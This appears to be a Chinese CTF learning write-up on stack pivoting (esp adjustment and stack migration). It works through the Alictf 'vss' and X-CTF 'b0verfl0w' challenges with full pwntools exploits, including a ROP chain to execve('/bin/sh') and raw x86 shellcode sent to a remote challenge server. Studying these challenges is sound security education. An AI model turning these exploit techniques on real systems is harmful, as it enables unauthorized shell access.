* * *
## title: 花式栈溢出（栈帧的调节）
# 花式栈溢出（栈帧的调节）
## 前言
本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。  
在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：
  * 加减esp值，控制栈指针
  * Stack Migration来构造一个假的栈帧。
这里总结了2种题型：
## 加减esp，把控栈指针
这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。
### Alictf_016_vss
这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。
#### 检查保护和arch
#### ida分析
由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，  
很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。  
start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数  
那个箭头就是main函数了。进入main函数以后， **可以经过syscall中rax的参数来确认其是什么函数**
，很明显一个函数是alarm函数，先手动nop一下。  
把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。  
下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：  
对于这个函数，先确定一下其参数。  
dump过去就会发现是复制了一份。所以就确定这个函数是`strncpy`是函数。  
对于这个函数`char *strncpy(char *dest, const char *src, int n)`
**将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest** 。  
对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。  
往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。  
溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数， **我们输入的字符串中是不能有\x00**
，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。
在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。
查到one_gadget发现`0x000000000046f205 : add rsp, 0x58 ;
ret`正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。
**（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）**
#### exp
    from pwn import *
    import time
    io = process('./vss')
    e = ELF('./vss')
    io.recvuntil('Password:\n')
    add_rsp_0x58_ret = 0x0046f205
    pop_rax_ret = 0x0046f208
    pop_rdi_ret = 0x0401823
    pop_rsi_ret = 0x0401937
    pop_rdx_ret = 0x043ae05
    bss = 0x6C8178 -10
    syscall_ret = 0x0045f2a5
    rop1 = [
        pop_rax_ret,
        0,
        pop_rdi_ret,
        0,
        pop_rsi_ret,
        bss,
        pop_rdx_ret,
        10,
        syscall_ret,
        pop_rax_ret,
        0x3b,
        pop_rdi_ret,
        bss,
        pop_rsi_ret,
        0,
        pop_rdx_ret,
        0,
        syscall_ret
    ]
    # raw_input('->')
    io.sendline('py' + 'a'*70 + p64(add_rsp_0x58_ret)+ 'b'* 8 + ''.join(map(p64,rop1)))
    # raw_input('->')
    sleep(0.1)
    io.send('/bin/sh\x00')
    io.interactive()
### X-CTF Quals 2016-b0verfl0w
#### 查保护和arch
这个nx也没有开，可以用栈执行shellcode
#### ida分析
    signed int vul()
    {
      char s; // [esp+18h] [ebp-20h]
      puts("\n======================");
      puts("\nWelcome to X-CTF 2016!");
      puts("\n======================");
      puts("What's your name?");
      fflush(stdout);
      fgets(&s, 50, stdin);
      printf("Hello %s.", &s);
      fflush(stdout);
      return 1;
    }
代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启
ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向
shellcode 处，并且直接控制程序跳转至 esp 处。
找一下控制esp的gadget
    0x08048504 : jmp esp
然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：
    sub esp,0x28
    jmp esp
#### exp
    from pwn import *
    #io = process('./b0verfl0w')
    context.arch = 'i386'
    io = remote('node3.buuoj.cn',29410)
    shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
    shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
    shellcode += "\x0b\xcd\x80"
    sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
    jmp_esp = 0x08048504
    payload = shellcode + (36-len(shellcode_x86))*'b'+p32(jmp_esp) + sub_esp_jmp
    io.readuntil('?\n')
    #raw_input('->')
    io.sendline(payload)
    io.interactive()
## Stack Migration
在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。
### 原理
我们知道在函数建立栈帧时有两条指令`push ebp; mov ebp, esp`，而退出时同样需要消除这两条指令的影响，即`leave(mov esp,
ebp; pop ebp)` 。且leave一般紧跟着就是ret。
**因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。**
第一次随着程序流`leave; ret`，new esp为我们构造新栈的目标地址。
可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。  
第二次进入我们放入栈上的`leave; ret` 的gadget（ **这个是我们事先写上栈的**
）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new
stack上布置的rop链可以轻松完成攻击。  
### HITCON_training_lab6_64位
这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。